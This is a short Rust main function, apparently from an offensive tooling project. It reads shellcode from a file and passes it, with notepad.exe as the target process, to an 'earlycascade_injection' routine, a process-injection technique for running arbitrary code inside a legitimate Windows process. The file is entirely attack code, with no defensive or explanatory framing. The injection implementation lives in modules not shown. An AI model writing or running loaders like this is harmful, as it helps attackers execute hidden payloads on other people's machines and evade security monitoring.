

fn main() {
    let shellcode = shared::simple_load_from_file();
    let process_name = "C:\\Windows\\System32\\notepad.exe".to_string();
    unsafe {
        earlycascade_injection::run(process_name, shellcode);
    }
}